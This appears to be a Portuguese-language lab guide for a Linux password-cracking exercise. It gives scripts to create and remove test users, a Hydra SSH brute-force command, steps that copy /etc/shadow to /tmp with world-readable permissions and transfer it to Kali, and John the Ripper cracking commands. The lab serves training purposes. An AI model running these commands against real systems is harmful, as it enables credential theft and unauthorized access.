## Download de script para criar usuários no Linux
```
wget https://github.com/sergiorez-cmd/secbitrez/raw/refs/heads/main/passwd-crack/create-users.zip
```
## Criar usuários no Linux e definir senhas via wordlist
```
#!/bin/bash
# Script para criar usuários e definir senhas em sistemas Linux
# Para utilizar esse script aplique permissão de execução via "$ chmod +x script_name.sh"

# Define o caminho para o arquivo de usuários e senhas
USER_FILE="users-passwd.txt"

# Verifica se o script está sendo executado como root
if [ "$(id -u)" -ne 0 ]; then
   echo "Este script precisa ser executado com privilégios de root (use sudo)."
   exit 1
fi

# Verifica se o arquivo de usuários existe
if [ ! -f "$USER_FILE" ]; then
    echo "Arquivo $USER_FILE não encontrado."
    exit 1
fi

# Loop para ler cada linha do arquivo
# O IFS (Internal Field Separator) é definido como : para separar o nome de usuário da senha
while IFS=: read -r username password; do
    # Remove espaços em branco extras (opcional)
    username=$(echo "$username" | xargs)
    password=$(echo "$password" | xargs)

    if [ -z "$username" ] || [ -z "$password" ]; then
        echo "Linha inválida ou vazia, pulando..."
        continue
    fi

    # Cria o usuário com diretório home (-m) e shell padrão (-s /bin/bash)
    # Em sistemas baseados em Debian/Ubuntu, useradd já cria o grupo com o mesmo nome
    if useradd -m -s /bin/bash "$username"; then
        echo "Usuário '$username' criado com sucesso."
        
        # Define a senha para o usuário usando chpasswd
        # O comando chpasswd lê a entrada no formato usuario:senha
        echo "$username:$password" | chpasswd
        
        if [ $? -eq 0 ]; then
            echo "Senha para '$username' definida com sucesso."
            # Opcional: forçar o usuário a mudar a senha no primeiro login
            # chage -d 0 "$username"
        else
            echo "Falha ao definir a senha para '$username'."
        fi
    else
        echo "Falha ao criar o usuário '$username' (talvez já exista)."
    fi
    echo "----------------------------------------"
done < "$USER_FILE"

echo "Processo de criação de usuários concluído."

```
## Executar Hydra para quebrar senhas de usuários via SSH (Kali Linux)
```
hydra -f -l name_user -P /usr/share/wordlists/rockyou.txt ssh://<Target_IP>
```
## Copiar arquivos de usuários e senhas do Linux para pasta tmp
```
sudo bash -c " \
cp /etc/passwd /tmp/passwd
cp /etc/shadow /tmp/shadow
"
```
## Alterar permissões dos arquivos passwd e shadow
```
sudo bash -c " \
chmod 666 /tmp/passwd
chmod 666 /tmp/shadow
"
```
## Tranferir arquivos via SFTP para o Kali Linux
```
sftp user@192.168.122.202
user@192.168.122.202's password: 
Connected to 192.168.122.202.
sftp> ls /tmp
sftp> get /tmp/passwd
sftp> get /tmp/shadow
```
## Converter arquivos de hash para o formato compativel do John The Ripper (Kali Linux)
```
unshadow passwd shadow > hashes-linux.txt
```
## Download de wordlist para quebra de hashes
```
wget https://github.com/sergiorez-cmd/secbitrez/raw/refs/heads/main/wordlists/100k-most-used-passwords-NCSC.txt
```
## Executar John The Ripper para quebrar hashs das senhas dos usuários (Kali Linux)
```
john --wordlist=100k-most-used-passwords-NCSC.txt --format=crypt hashes-linux.txt
```
## Remover usuários do Linux
```
#!/bin/bash
# Script para deletar usuários via lista em sistemas Linux
# Para utilizar esse script aplique permissão de execução via "$ chmod +x script_name.sh"

# Verifica se o script está sendo executado como root
if [ "$(id -u)" -ne 0 ]; then
  echo "Este script precisa ser executado com privilégios de root (use sudo)."
  exit 1
fi

# Verifica se foi passado um nome de arquivo como argumento
if [ -z "$1" ]; then
  echo "Uso: $0 <arquivo_com_lista_de_usuarios>"
  exit 1
fi

# Abre o arquivo de lista de usuários
while IFS= read -r user || [ -n "$user" ]; do
  if [ -n "$user" ]; then
    echo "Removendo o usuário: $user"
    # Tenta remover o usuário e seu home directory
    userdel -r "$user"
    if [ $? -eq 0 ]; then
      echo "Usuário $user removido com sucesso."
    else
      echo "Não foi possível remover o usuário $user."
    fi
  fi
done < "$1"

echo "Processo de remoção de usuários concluído."

```
